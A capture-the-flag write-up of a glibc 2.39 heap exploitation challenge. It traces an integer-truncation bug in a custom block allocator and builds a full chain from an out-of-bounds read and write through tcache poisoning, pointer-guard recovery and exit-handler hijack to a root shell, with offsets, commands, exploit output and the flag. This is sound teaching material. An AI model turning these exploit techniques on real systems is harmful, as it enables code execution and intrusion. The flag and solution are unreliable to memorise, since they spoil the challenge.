# The Alignment Trap

## Metadata

| Field | Value |
| --- | --- |
| Category | `pwn` |
| Difficulty | Hard |
| Points | 260 |
| Solves | 48 |
| First Blood | serrooT |

## Challenge Description

```text
Fluid Cloud Storage keeps your data blocks neatly aligned with a custom allocator.
Custom allocators never go wrong.

It's running remotely, and the flag is on the filesystem.
```

## Artifacts

The provided file is an encrypted zip. The password is `infected`:

```bash
7z x -pinfected public.zip -oextracted -y
```

After extraction:

```text
public.zip
extracted/cloudstorage
extracted/libc.so.6
extracted/ld-linux-x86-64.so.2
solve.py
```

## Recon

The first question was: "what kind of target is this, and which runtime does it use?"

```bash
file extracted/cloudstorage extracted/libc.so.6 extracted/ld-linux-x86-64.so.2
```

The output classified the main artifact as a stripped 64-bit PIE ELF,
dynamically linked, with the provided libc and loader:

```text
extracted/cloudstorage:         ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
extracted/libc.so.6:            ELF 64-bit LSB shared object, x86-64, stripped
extracted/ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, static-pie linked, stripped
```

Then I checked the exact glibc version shipped with the challenge:

```bash
./extracted/libc.so.6 | head -n 1
./extracted/ld-linux-x86-64.so.2 --version | head -n 1
```

```text
GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
ld.so (Ubuntu GLIBC 2.39-0ubuntu8.7) stable release version 2.39.
```

Next I checked the basic binary protections.

```bash
readelf -h extracted/cloudstorage
readelf -l extracted/cloudstorage
readelf -d extracted/cloudstorage | rg 'BIND_NOW|FLAGS|FLAGS_1'
```

Representative output:

```text
Type: DYN (Position-Independent Executable file)
GNU_STACK: RW
GNU_RELRO: present
0x000000000000001e (FLAGS)   BIND_NOW
FLAGS_1: Flags: NOW PIE
```

This ruled out simple GOT overwrite as the first plan: the binary is PIE and
uses full RELRO/NOW, so the useful path was more likely a heap primitive turned
into a libc data overwrite.

The first useful lead came from looking at strings. At this stage I was not
trying to prove the vulnerability yet; I only wanted to understand what kind of
program this was and which features were worth opening in the decompiler:

```bash
strings -tx extracted/cloudstorage | more
```

Relevant output:

```text
2030 ==============================================
2060     Fluid Cloud Storage Service v3.8.1
2088     Enterprise Aligned Block Storage
20b0 [!] Maximum block limit reached.
20d8 Block alignment (power of 2, e.g. 16, 32, 64):
2108 [!] Alignment must be a power of 2.
2130 AUDIT: Block %d created, align=%zu, size=%zu
2160 [+] Block %d created (alignment: %zu, size: %zu)
2198 [!] Block integrity check failed.
21c0 [+] Wrote %zu bytes to block %d
21e8 [+] Block %d data (%zu bytes):
2208 [!] Corrupted block detected during free.
2238 Freelist entries: %d (total: %zu bytes)
2268   [%d] size=%zu align=%zu magic=0x%llx
2290 [*] Verifying block integrity...
```

These strings were interesting, but they were still only clues. The names
suggested a storage service with blocks, alignment, a free list, integrity
checks and a magic value. The strings `Block alignment`, `Block data size`,
`Freelist entries` and `Corrupted block detected during free` made me suspect
that the challenge could involve heap allocation metadata, but I still needed to
see if these strings were actually reachable and how the values were used.

So I ran the binary directly. That showed the strings were part of a reachable
interactive menu:

```bash
./extracted/ld-linux-x86-64.so.2 --library-path ./extracted ./extracted/cloudstorage
```

```text
==============================================
    Fluid Cloud Storage Service v3.8.1
    Enterprise Aligned Block Storage
==============================================

--- Storage Operations ---
1) Create Block
2) Write Block
3) Read Block
4) Delete Block
5) Storage Status
6) Toggle Audit Mode
7) Compact Freelist
8) Verify Integrity
9) Exit
> [*] Shutting down storage service.
```

Combining the terminal menu with the strings, my working hypothesis became:
there is a custom block manager where the user can create, read, write and free
blocks, and the risky values are probably the user-provided alignment and size.
That was enough direction to move into Ghidra.

In Ghidra, I used `Search -> For Strings` and looked for the strings already
seen in the terminal. Then I followed the cross-references from the prompts that
looked most relevant:

```text
001020d8 "Block alignment ..."          referenced from 0010176d in FUN_001012a0
001023ed "Block data size:"             referenced from 00101785 in FUN_001012a0
001024e5 "[*] Compacting freelist..."   referenced from 001014c0 in FUN_001012a0
```

That was a useful sign: the create prompts and the compact/free-list operation
both landed in the same decompiled function. I opened `FUN_001012a0` in the
Decompiler window and saw the menu switch in one place:

```text
case 1: Create Block
case 2: Write Block
case 3: Read Block
case 4: Delete Block
case 7: Compact Freelist
case 9: exit(0)
```

That way I focused on `FUN_001012a0`: it appeared to contain the full
create/write/read/delete/compact logic. The plan: follow how option 1 calculates allocation
size, then compare that with how options 2 and 3 decide how many bytes can be written or read.

## Vulnerability

The suspicious artifact was not simply "custom allocator".
The vulnerability became plausible after comparing four concrete observations from `FUN_001012a0`:

1. Option 1 reads `alignment` and `size` directly from the user:

   ```c
   __printf_chk(2,"Block alignment (power of 2, e.g. 16, 32, 64): ");
   uVar12 = read_number();
   __printf_chk(2,"Block data size: ");
   uVar17 = read_number();
   ```

   So both values that influence allocation are attacker-controlled.

2. The validation looks permissive near 32-bit boundaries:

   ```c
   if ((uVar17 < 0xffff0001) && (uVar12 < 0x80000001)) {
       if ((uVar12 == 0) || ((uVar12 - 1 & uVar12) != 0)) {
           puts("[!] Alignment must be a power of 2.");
       }
   }
   ```

   The code accepts a size as large as `0xffff0000` and an alignment up to
   `0x80000000`, as long as the alignment is a power of two.

3. The actual `malloc` size is computed with 32-bit casts:

   ```c
   __size = (ulong)(uint)((int)uVar17 + -1 + (int)uVar13 & -(int)uVar13) + 0x18;
   puVar9 = malloc(__size);
   ```

   This is the first real bug candidate: the program parses 64-bit-looking
   values, but truncates them to `int`/`uint` for the allocation calculation.

4. The original logical size is stored separately and later printed/used:

   ```c
   puVar9[2] = uVar17;      // logical size
   *puVar9 = 0xaa55aa55;    // magic
   puVar9[1] = uVar13;      // alignment
   ```

   This means I needed to check whether write/read use `__size` or `puVar9[2]`.
   If they use `puVar9[2]`, then a wrapped `malloc` size can become an OOB
   read/write.

A normal block behaves as expected:

```bash
printf '1\n16\n32\n5\n9\n' | ./extracted/ld-linux-x86-64.so.2 --library-path ./extracted ./extracted/cloudstorage
```

```text
[+] Block 0 created (alignment: 16, size: 32)

--- Storage Status ---
Active blocks: 1 / 16
Freelist entries: 0 (total: 0 bytes)
  [0] size=32 align=16 magic=0xaa55aa55
```

Then I tested boundary-looking values based on the create checks in Ghidra:

```bash
printf '1\n131072\n4294901760\n5\n9\n' | ./extracted/ld-linux-x86-64.so.2 --library-path ./extracted ./extracted/cloudstorage
```

```text
[+] Block 0 created (alignment: 131072, size: 4294901760)

--- Storage Status ---
Active blocks: 1 / 16
Freelist entries: 0 (total: 0 bytes)
  [0] size=4294901760 align=131072 magic=0xaa55aa55
```

At this point the terminal still only proved that huge values were accepted and
stored as logical metadata. The decompile explains why those values are
dangerous: the bad idea is the cast to 32-bit signed/unsigned arithmetic in the
allocation size calculation.

```text
real allocation = (uint32_t)align_up((int)size, (int)align) + 0x18
logical size    = original 64-bit size stored at block+0x10
```

For the malicious block:

```bash
python3 -c 'size=0xffff0000; align=0x20000; wrapped=((size+align-1)&0xffffffff)&((-align)&0xffffffff); print(hex(wrapped), hex(wrapped+0x18))'
```

```text
0x0 0x18
```

So the program allocates only `0x18` bytes, exactly the metadata header size,
but it stores the logical user size as `0xffff0000`.

The write and read paths use the stored logical size, only capped to `0x10000`;
they do not use the real allocation size:

```c
uVar12 = plVar1[2];
if (0x10000 < uVar12) {
    uVar12 = 0x10000;
}
read(0, (void *)((long)plVar1 + uVar17 + 0x18), uVar12 - uVar17);
```

```c
uVar12 = plVar1[2];
if (0x10000 < uVar12) {
    uVar12 = 0x10000;
}
write(1, plVar1 + 3, uVar12);
```

That turns block 0 into a heap out-of-bounds read/write primitive of up to
`0x10000` bytes starting at `block + 0x18`.

The delete/compact logic matters because delete only queues the chunk in a
custom free list, while compact performs the real `free`:

```c
// delete
*plVar1 = 0;
plVar8 = malloc(0x20);
plVar8[2] = (ulong)(((int)size + (int)align) - 1U & -(int)align) + 0x18;
plVar8[3] = (long)plVar1;

// compact
free((void *)plVar1[3]);
free(plVar1);
```

This gives controlled moments where neighboring chunks become freed and their
allocator metadata can be read or overwritten through block 0.

The search terms I used to validate the exploitation direction were:

```text
glibc 2.39 tcache poisoning safe-linking
glibc __exit_funcs PTR_MANGLE system
glibc exit_function_list pointer guard fs:0x30
```

Those searches matched the primitives in this challenge: tcache poisoning with
safe-linking, plus hijacking glibc exit handlers after recovering the pointer
guard.

## Exploitation

The exploit is in `solve.py`. It uses `pwntools` from the local `.venv`.
Without arguments, it launches the provided loader and libc against
`extracted/cloudstorage`.

```bash
python solve.py
```

After local validation, the same script can connect to the remote host.

```bash
python solve.py 7d86b20d75e30941.chal.ctf.ae 443
```

The local exploit chain is:

1. Create the malicious tiny-real / huge-logical block:

   ```text
   align = 0x20000
   size  = 0xffff0000
   ```

   This is slot 0 and becomes the OOB read/write window.

2. Allocate two normal chunks after it:

   ```text
   slot 1: size 0x500
   slot 2: size 0x100
   ```

   Slot 2 prevents the large slot 1 chunk from merging into the top chunk when
   freed.

3. Delete slot 1 and run compact. Compact calls real `free(slot1)`, so slot 1
   enters the unsorted bin.

4. Read from block 0. Because block 0 can read past its real allocation, it sees
   the freed slot 1 metadata. The unsorted-bin `fd`/`bk` pointers point into
   libc's `main_arena`, giving a libc leak:

   ```python
   return unpack64(self.readblk(0)[8:16]) - 0x203B20
   ```

5. Prepare a 0x50 tcache poisoning primitive. A freed tcache chunk stores its
   safe-linked `next` pointer as:

   ```text
   protected_next = target ^ (chunk_address >> 12)
   ```

   The exploit frees a known chunk, reads its masked value through block 0, and
   uses that as the heap page mask.

6. Poison the 0x50 tcache bin so that a later `malloc(0x48-ish)` returns a
   pointer into libc-controlled data. The core write is:

   ```python
   self.writeblk(0, p64(0x51) + p64(target ^ self.mask))
   ```

   `0x51` is the forged chunk size for the 0x50 tcache class, and
   `target ^ mask` is the safe-linked forward pointer.

7. Leak the current glibc exit handler entry at `libc + 0x204fc0`. The exploit
   targets `head + 8 - 0x18` because the service's user data begins after a
   `0x18`-byte block header. That makes the returned user pointer line up with
   the `idx` and first function entry of `struct exit_function_list`.

8. Read the existing mangled `_dl_fini` pointer from the first exit handler.
   This is needed because glibc mangles function pointers before storing them in
   exit handlers.

9. Leak `__nptl_rtld_global` at `libc + 0x2046b8`. That pointer gives the
   `ld-linux` base:

   ```text
   ld_base = leaked_rtld_global - 0x38000
   ```

10. Recover the pointer guard. On x86-64 glibc, `PTR_MANGLE` is:

    ```text
    mangled = rol(pointer ^ pointer_guard, 17)
    ```

    The known plain pointer is `_dl_fini` inside `ld-linux`, so:

    ```text
    pointer_guard = ror(mangled_dl_fini, 17) ^ (ld_base + 0x5380)
    ```

11. Overwrite the first exit handler so that option 9 calls
    `system("/bin/sh")`:

    ```text
    idx    = 1
    flavor = 4                  # ef_cxa
    func   = rol((system ^ guard), 17)
    arg    = libc + "/bin/sh"
    ```

12. Send menu option 9. The program calls `exit(0)`, glibc runs the modified
    exit handler, demangles the function pointer, and executes
    `system("/bin/sh")`.

## Technical Details

The service block layout from the decompile is:

```text
block + 0x00: magic = 0xaa55aa55
block + 0x08: alignment
block + 0x10: logical size
block + 0x18: user data
```

The allocation bug is an integer truncation in a size calculation. The inputs
are parsed with 64-bit conversion, but the allocation expression uses `(int)`
and `(uint)`:

```text
__size = (uint32_t)(((int)size + (int)align - 1) & -(int)align) + 0x18
```

With `size=0xffff0000` and `align=0x20000`, the rounded 32-bit value becomes
zero, so `malloc(0x18)` is used. Since `block+0x18` is the start of user data,
the chunk has no real user data space, but the service still allows reads and
writes based on the logical size.

Important offsets used by `solve.py`:

```text
libc unsorted-bin leak adjustment: 0x203b20
__nptl_rtld_global:              0x2046b8
__exit_funcs list head:          0x204fc0
system:                          0x58750
"/bin/sh":                       0x1cb42f
_rtld_global in ld-linux:        0x38000
_dl_fini in ld-linux:            0x5380
```

Offsets confirmed directly from the shipped artifacts where symbols/strings are
public:

```bash
readelf -sW extracted/libc.so.6 | rg ' system@@| __nptl_rtld_global'
strings -tx extracted/libc.so.6 | rg '/bin/sh'
readelf -sW extracted/ld-linux-x86-64.so.2 | rg ' _rtld_global'
```

```text
system@@GLIBC_2.2.5                 0x58750
__nptl_rtld_global@@GLIBC_PRIVATE   0x2046b8
/bin/sh                             0x1cb42f
_rtld_global@@GLIBC_PRIVATE         0x38000
```

`__exit_funcs` is a hidden libc internal, so it does not appear in `nm -D` like
`system` does. The exploit treats its offset as part of the glibc-2.39-specific
targeting, then validates it dynamically by reading an exit function entry that
contains a plausible mangled `_dl_fini` pointer.

The relevant glibc structures explain why this target is useful:

```c
struct exit_function_list {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
};
```

On exit, glibc iterates over `fns`, demangles the function pointer, and calls it.
For `ef_cxa`, the function type is:

```c
void (*fn)(void *arg, int status);
```

That calling convention works with `system(char *cmd)`: the first argument is
the command string pointer, and the extra status argument is ignored by the
callee on x86-64 SysV.

## Exploit Artifact

`solve.py` uses `pwntools` for process/remote tubes and keeps the exploit logic
explicit. The important functions are:

```text
create(align, size)        menu option 1
delete(idx)                menu option 4
compact()                  menu option 7, performs real frees
readblk(idx)               menu option 3, used as OOB read
writeblk(idx, data)        menu option 2, used as OOB write
leak_libc()                unsorted-bin leak through block 0
init_tcache_poison()       recover safe-linking mask
poison(target)             make malloc return target-backed fake block
run()                      leak bases, recover guard, overwrite exit handler
```

Local run:

```bash
python solve.py
```

Local run with proof commands sent to the spawned shell:

```bash
python solve.py local 'id; pwd; exit'
```

Remote run, after local validation:

```bash
python solve.py <REMOTE URL>
python solve.py <REMOTE URL> 'id'
```

## Validation

Normal block creation:

```text
[+] Block 0 created (alignment: 16, size: 32)
  [0] size=32 align=16 magic=0xaa55aa55
```

Malicious block creation:

```text
[+] Block 0 created (alignment: 131072, size: 4294901760)
  [0] size=4294901760 align=131072 magic=0xaa55aa55
```

Local exploit output:

```text
[*] starting local process with shipped loader/libc
[x] Starting local process '/home/claudio/Fluids/TheAlignmentTrap/extracted/ld-linux-x86-64.so.2'
[+] Starting local process '/home/claudio/Fluids/TheAlignmentTrap/extracted/ld-linux-x86-64.so.2': pid 299
[+] libc = 0x7cb5d2800000
[+] heap mask = 0x55556b2a7
[+] mangled _dl_fini = 0xc0704b50f955d1a8
[+] ld = 0x7cb5d2af7000
[+] pointer guard = 0xe8d41c8df707bf2a
[*] Shutting down storage service.
uid=1000(claudio) gid=1000(claudio) groups=1000(claudio),65534(nogroup)
/home/claudio/Fluids/TheAlignmentTrap
free(): invalid size
[*] Process '/home/claudio/Fluids/TheAlignmentTrap/extracted/ld-linux-x86-64.so.2' stopped with exit code -6 (SIGABRT) (pid 299)
```

The `id` and `pwd` output appears after the program prints its shutdown message,
which confirms that option 9 reached the hijacked exit handler and spawned a
shell. The final `free(): invalid size` happens after the shell exits, during
process teardown with corrupted heap/libc state; it does not prevent command
execution.

Remote validation:

```bash
python solve.py 7d86b20d75e30941.chal.ctf.ae 443
[*] connecting to 7d86b20d75e30941.chal.ctf.ae:443 ssl=True
[+] Opening connection to 7d86b20d75e30941.chal.ctf.ae on port 443: Done
[+] libc = 0x7f9ac542f000
[+] heap mask = 0x56472b029
[+] mangled _dl_fini = 0xa988cd966d238942
[+] ld = 0x7f9ac5645000
[+] pointer guard = 0xc4a12b5ea3af9511
[*] Switching to interactive mode
[*] Shutting down storage service.
$ id
uid=0(root) gid=0(root) groups=0(root)
$ find . -name *flag*
./flag_721aac4847a7fa2233dc2880b16dba0f.txt
$ cat ./flag_721aac4847a7fa2233dc2880b16dba0f.txt
flag{035a6e568a477269}$
```


## References

- <https://github.com/shellphish/how2heap/blob/master/glibc_2.39/tcache_poisoning.c>
- <https://github.com/shellphish/how2heap/blob/master/glibc_2.39/decrypt_safe_linking.c>
- <https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#320>
- <https://codebrowser.dev/glibc/glibc/stdlib/exit.h.html#55>
- <https://codebrowser.dev/glibc/glibc/stdlib/exit.c.html#70>
- <https://codebrowser.dev/glibc/glibc/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h.html#43>
- <https://blog.rop.la/en/exploiting/2024/06/11/code-exec-part1-from-exit-to-system.html>

## Flag

```text
flag{035a6e568a477269}
```
